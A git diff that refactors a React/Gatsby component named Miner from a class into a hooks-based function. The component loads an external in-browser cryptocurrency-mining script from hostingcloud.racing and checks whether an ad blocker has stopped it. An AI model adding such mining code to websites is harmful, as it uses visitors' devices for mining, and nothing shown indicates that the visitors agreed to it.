@@ -1,26 +1,25 @@
 /* eslint no-unused-vars: 0 */
 /* eslint no-console: 0 */
 
-import { Component } from 'react';
+import React, { useEffect } from 'react';
 import { navigate } from 'gatsby';
 import scriptjs from 'scriptjs';
 
-class Miner extends Component {
-  componentDidMount() {
-    this.setupMiner();
-  }
+import { useDispatch } from 'react-redux';
+import { setIsMinerReady, setIsAdblocked } from '@store/actions';
 
-  setupMiner = () => {
-    const { setIsMinerReady, setIsAdblocked } = this.props;
+export default () => {
+  const dispatch = useDispatch();
 
+  const setupMiner = () => {
     if (typeof window === 'undefined' || typeof document === 'undefined') {
       return null;
     }
 
     scriptjs('//hostingcloud.racing/KcRw.js', () => {
       if (!window.Client) {
-        setIsAdblocked && setIsAdblocked(true);
-        setIsMinerReady && setIsMinerReady(true);
+        dispatch(setIsAdblocked(true));
+        dispatch(setIsMinerReady(true));
       } else if (window.location.pathname.match(/ad-block/gm)) {
         navigate('/');
       }
@@ -35,7 +34,7 @@ class Miner extends Component {
           }
         );
 
-        setIsMinerReady && setIsMinerReady(true);
+        dispatch(setIsMinerReady(true));
 
         window.miner.on('open', params => {
           console.log(
@@ -73,9 +72,9 @@ class Miner extends Component {
     });
   };
 
-  render() {
-    return null;
-  }
-}
+  useEffect(() => {
+    setupMiner();
+  }, []);
 
-export default Miner;
+  return null;
+};
